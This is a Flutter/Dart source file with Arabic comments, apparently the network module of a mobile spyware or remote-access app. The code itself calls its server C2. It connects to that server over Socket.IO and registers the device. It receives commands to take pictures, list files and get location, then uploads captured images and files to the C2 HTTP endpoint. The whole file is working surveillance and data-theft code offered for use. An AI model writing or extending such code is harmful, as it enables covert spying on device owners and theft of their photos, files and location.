// lib/services/network_service.dart
import 'dart:async';
import 'dart:convert'; // لتحويل json
import 'dart:io'; // لاستخدام File
import 'package:http/http.dart' as http;
import 'package:camera/camera.dart'; // لاستخدام XFile
import 'package:flutter/foundation.dart'; // for debugPrint
import 'package:socket_io_client/socket_io_client.dart'
    as sio; // <<<--- إضافة Socket.IO Client

import '../config/app_config.dart'; // للوصول إلى URLs والثوابت
import '../utils/constants.dart'; // للوصول إلى أسماء الأحداث ونقاط النهاية

class NetworkService {
  // --- HTTP Related ---
  // لا نحتاج لتعريف _uploadEndpoint هنا، استخدم الثوابت من constants.dart

  sio.Socket? _socket; // <<<--- كائن Socket.IO

  // StreamControllers for exposing connection status and commands to other services (like BackgroundService)
  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;

  bool get isSocketConnected => _socket?.connected ?? false;

  // --- Constructor ---
  NetworkService() {
    // يمكن تهيئة الـ socket هنا أو عند الحاجة
    // _initializeSocket(); // أو استدعاؤها من BackgroundService
  }

  // --- Socket.IO Methods ---
  void _initializeSocket(String deviceIdForConnectionLog) {
    if (_socket != null && _socket!.connected) {
      debugPrint("NetworkService: Socket already initialized and connected.");
      return;
    }

    debugPrint(
      "NetworkService: Initializing Socket.IO connection to $C2_SOCKET_IO_URL",
    );
    try {
      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        'transports': ['websocket'], // تفضيل WebSocket
        'autoConnect': false, // سنتصل يدوياً
        'forceNew': true, // لضمان اتصال جديد إذا كان هناك اتصال قديم عالق
        // يمكنك إضافة headers مخصصة إذا احتاج السيرفر لذلك
        // 'extraHeaders': {'my-custom-header': 'my-value'}
        'query': {
          'deviceId': deviceIdForConnectionLog,
          'clientType': APP_NAME,
        }, // إرسال ID مبدئي مع الاتصال
      });

      _socket!.onConnect((_) {
        debugPrint('NetworkService: Socket.IO Connected! SID: ${_socket?.id}');
        _connectionStatusController.add(true);
        // لا نرسل 'register_device' هنا مباشرة، ننتظر استدعاء registerDeviceWithC2
      });

      _socket!.onDisconnect((reason) {
        debugPrint('NetworkService: Socket.IO Disconnected. Reason: $reason');
        _connectionStatusController.add(false);
        // لا تحاول إعادة الاتصال تلقائيًا هنا إذا كانflutter_background_service سيعيد تشغيل onStart
      });

      _socket!.onConnectError((error) {
        debugPrint('NetworkService: Socket.IO Connection Error: $error');
        _connectionStatusController.add(false);
      });

      _socket!.onError((error) {
        debugPrint('NetworkService: Socket.IO Generic Error: $error');
        // قد يكون هذا خطأ في بروتوكول Socket.IO نفسه أو خطأ غير معالج
      });

      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        debugPrint(
          'NetworkService: Received SIO_EVENT_REGISTRATION_SUCCESSFUL: $data',
        );
        // يمكنك القيام بشيء ما هنا إذا أردت، مثل تأكيد التسجيل
      });

      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        debugPrint(
          'NetworkService: Received SIO_EVENT_REQUEST_REGISTRATION_INFO from server.',
        );
        // هنا يجب على BackgroundService أن يستجيب بإعادة إرسال معلومات التسجيل
        // يمكننا إرسال هذا كـ "أمر" داخلي إلى BackgroundService
        _commandController.add({
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'args': {},
        });
      });

      // --- الاستماع للأوامر الواردة من C2 ---
      _listenToC2Commands();
    } catch (e) {
      debugPrint(
        "NetworkService: Exception during Socket.IO initialization: $e",
      );
      _connectionStatusController.add(false);
    }
  }

  void _listenToC2Commands() {
    if (_socket == null) return;

    // قائمة الأوامر التي نتوقعها من السيرفر
    final List<String> expectedCommands = [
      SIO_CMD_TAKE_PICTURE,
      SIO_CMD_LIST_FILES,
      SIO_CMD_GET_LOCATION,
      // أضف أي أوامر مخصصة أخرى هنا
    ];

    for (String commandName in expectedCommands) {
      _socket!.on(commandName, (data) {
        debugPrint(
          "NetworkService: Received command '$commandName' from C2 with data: $data",
        );
        // تمرير الأمر ومعطياته إلى BackgroundService عبر Stream
        _commandController.add({'command': commandName, 'args': data ?? {}});
      });
    }
    // يمكنك أيضاً إضافة معالج عام لكل الأحداث إذا أردت ('*') للتصحيح
    // _socket.onAny((event, data) => debugPrint("Socket.IO ANY Event: $event, Data: $data"));
  }

  Future<void> connectSocketIO(String deviceIdForConnectionLog) async {
    if (_socket == null) {
      _initializeSocket(deviceIdForConnectionLog);
    }
    if (!_socket!.connected) {
      debugPrint("NetworkService: Attempting to connect socket...");
      _socket!.connect();
    } else {
      debugPrint("NetworkService: Socket already connected.");
    }
  }

  void disconnectSocketIO() {
    if (_socket != null && _socket!.connected) {
      debugPrint("NetworkService: Disconnecting Socket.IO...");
      _socket!.disconnect();
    }
    // _socket?.dispose(); // قد تحتاج لاستدعاء dispose إذا كنت متأكداً أنك لن تعيد استخدام هذا الكائن
    // _socket = null; // أعد تعيينه لتسمح بـ _initializeSocket جديد
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      debugPrint(
        "NetworkService: Sending SIO_EVENT_REGISTER_DEVICE with payload: ${jsonEncode(deviceInfoPayload)}",
      );
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload);
    } else {
      debugPrint(
        "NetworkService: Cannot register device. Socket not connected.",
      );
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      // debugPrint("NetworkService: Sending SIO_EVENT_DEVICE_HEARTBEAT"); // قد يكون هذا مزعجاً في السجلات
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload);
    } else {
      // debugPrint("NetworkService: Cannot send heartbeat. Socket not connected.");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    required String status,
    dynamic payload, // يمكن أن يكون Map, List, String, num, bool
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'status': status,
        'payload': payload ?? {}, // تأكد من وجود payload حتى لو فارغ
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(),
      };
      debugPrint(
        "NetworkService: Sending SIO_EVENT_COMMAND_RESPONSE: ${jsonEncode(response)}",
      );
      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response);
    } else {
      debugPrint(
        "NetworkService: Cannot send command response. Socket not connected.",
      );
    }
  }

  // --- HTTP Methods ---
  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    // استخدام C2_HTTP_SERVER_URL من app_config.dart
    final Uri url = Uri.parse(
      C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA,
    );
    debugPrint("NetworkService: Sending initial data to: $url");
    debugPrint(
      "NetworkService: Initial JSON data being sent: ${jsonEncode(jsonData)}",
    );

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['json_data'] = jsonEncode(jsonData);

      if (imageFile != null) {
        debugPrint(
          "NetworkService: Attaching initial image file: ${imageFile.path}",
        );
        final file = File(imageFile.path);
        if (await file.exists()) {
          var stream = http.ByteStream(file.openRead());
          var length = await file.length();
          var multipartFile = http.MultipartFile(
            'image', // اسم الحقل المتوقع في السيرفر
            stream,
            length,
            filename: imageFile.name,
          );
          request.files.add(multipartFile);
          debugPrint(
            "NetworkService: Initial image file attached successfully.",
          );
        } else {
          debugPrint(
            "NetworkService: Initial image file does NOT exist at path: ${imageFile.path}",
          );
        }
      } else {
        debugPrint("NetworkService: No initial image file to attach.");
      }

      var response = await request.send().timeout(
        const Duration(seconds: 30),
      ); // إضافة timeout
      final responseBody = await response.stream.bytesToString();
      debugPrint(
        "NetworkService: Initial data - Server Response Status Code: ${response.statusCode}",
      );
      debugPrint(
        "NetworkService: Initial data - Server Response Body: $responseBody",
      );

      if (response.statusCode >= 200 && response.statusCode < 300) {
        debugPrint(
          "NetworkService: Initial data sent successfully to C2 server.",
        );
        return true;
      } else {
        debugPrint(
          "NetworkService: Failed to send initial data. Status Code: ${response.statusCode}",
        );
        return false;
      }
    } on TimeoutException catch (e) {
      debugPrint("NetworkService: Timeout sending initial data: $e");
      return false;
    } catch (e, s) {
      debugPrint(
        "NetworkService: Network Error sending initial data: $e\nStackTrace: $s",
      );
      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String commandRef, // مرجع للأمر الذي نتج عنه هذا الملف
    required XFile fileToUpload,
    String fieldName = 'file', // اسم الحقل المتوقع في السيرفر للملف
  }) async {
    final Uri url = Uri.parse(
      C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE,
    );
    debugPrint(
      "NetworkService: Uploading command file to: $url for device: $deviceId, command: $commandRef",
    );

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId;
      request.fields['commandRef'] = commandRef; // إرسال مرجع الأمر

      debugPrint(
        "NetworkService: Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}",
      );
      final file = File(fileToUpload.path);
      if (await file.exists()) {
        var stream = http.ByteStream(file.openRead());
        var length = await file.length();
        var multipartFile = http.MultipartFile(
          fieldName, // 'file' هو ما يتوقعه السيرفر
          stream,
          length,
          filename: fileToUpload.name,
        );
        request.files.add(multipartFile);
        debugPrint("NetworkService: Command file attached successfully.");
      } else {
        debugPrint(
          "NetworkService: Command file does NOT exist at path: ${fileToUpload.path}",
        );
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'error',
          payload: {
            'message':
                'File to upload not found on device at path ${fileToUpload.path}',
          },
        );
        return false;
      }

      var response = await request.send().timeout(
        const Duration(seconds: 60),
      ); // Timeout أطول للملفات
      final responseBody = await response.stream.bytesToString();
      debugPrint(
        "NetworkService: Command file upload - Server Response Status Code: ${response.statusCode}",
      );
      debugPrint(
        "NetworkService: Command file upload - Server Response Body: $responseBody",
      );

      if (response.statusCode >= 200 && response.statusCode < 300) {
        debugPrint("NetworkService: Command file uploaded successfully.");
        // إرسال رد عبر Socket.IO بأن الملف تم رفعه بنجاح
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'success',
          payload: {
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            'filename_on_server':
                responseBody, // افترض أن السيرفر يعيد اسم الملف أو تأكيداً
          },
        );
        return true;
      } else {
        debugPrint(
          "NetworkService: Failed to upload command file. Status Code: ${response.statusCode}",
        );
        sendCommandResponse(
          originalCommand: commandRef,
          status: 'error',
          payload: {
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody,
          },
        );
        return false;
      }
    } on TimeoutException catch (e) {
      debugPrint("NetworkService: Timeout uploading command file: $e");
      sendCommandResponse(
        originalCommand: commandRef,
        status: 'error',
        payload: {
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.',
        },
      );
      return false;
    } catch (e, s) {
      debugPrint(
        "NetworkService: Network Error uploading command file: $e\nStackTrace: $s",
      );
      sendCommandResponse(
        originalCommand: commandRef,
        status: 'error',
        payload: {
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}',
        },
      );
      return false;
    }
  }

  // للتأكد من إغلاق الموارد عند عدم الحاجة للخدمة (مثلاً عند إيقاف BackgroundService)
  void dispose() {
    debugPrint("NetworkService: Disposing resources.");
    disconnectSocketIO(); // يتضمن socket?.dispose() إذا كنت قد أضفتها
    _connectionStatusController.close();
    _commandController.close();
  }
}
